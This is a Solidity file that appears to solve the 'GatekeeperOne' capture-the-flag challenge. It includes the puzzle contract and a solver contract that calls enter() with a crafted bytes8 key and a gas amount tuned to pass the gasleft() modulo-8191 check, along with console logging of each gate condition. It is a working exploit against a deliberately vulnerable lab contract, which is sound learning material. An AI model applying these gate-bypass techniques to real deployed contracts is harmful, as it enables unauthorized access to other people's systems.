// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./math/SafeMath.sol";
import "hardhat/console.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneSolver {
    function attack(
        address gateKeeperAddress,
        bytes8 gateKey,
        uint256 gasAmountAdditional
    ) public {
        GatekeeperOne gateKeeper = GatekeeperOne(gateKeeperAddress);
        uint256 gasAmount = 8191 * 8 + gasAmountAdditional;
        console.log("-- Gas amount before: %i", gasAmount);
        gateKeeper.enter{gas: gasAmount}(gateKey);
        // (, bytes memory data) = address(gateKeeper).call{gas: gasAmount}(
        //     abi.encodeWithSignature("enter(bytes8 _gateKey)", gateKey)
        // );
        // console.log("-- attack() raw message: %s", abi.decode(data, (string)));
        // console.log("-- attack() message: %s", _getRevertMsg(data));
    }

    function testGateThree(bytes8 _gateKey) public view {
        console.log("uint64(_gateKey) = %i", uint64(_gateKey));
        console.log("uint32(uint64(_gateKey)) = %i", uint32(uint64(_gateKey)));
        console.log("uint16(uint64(_gateKey) = %i", uint16(uint64(_gateKey)));
        console.log(
            "Part1: %s",
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        );
        console.log("uint16(tx.origin) = %i", uint16(tx.origin));
        console.log("Part2: %s", uint32(uint64(_gateKey)) != uint64(_gateKey));
        console.log("Part3: %s", uint32(uint64(_gateKey)) == uint16(tx.origin));
    }
}
